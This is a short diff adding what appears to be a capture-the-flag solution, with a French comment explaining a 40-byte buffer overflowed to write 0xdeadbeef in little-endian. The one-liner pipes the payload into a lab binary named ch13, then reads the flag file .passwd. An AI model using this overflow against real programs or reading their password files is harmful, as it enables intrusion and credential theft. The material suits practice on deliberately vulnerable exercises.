@@ -1,0 +1,5 @@
+#on a un buffer d'une taille de 40 octects et on en lit 45. donc on overflow ce buffer en ecrivant le nombre que l'on veut en inversant les octects (little endian)
+
+(echo `python -c 'print "A"*40 +"\xef\xbe\xad\xde"'`;cat) | ./ch13
+ls
+cat .passwd
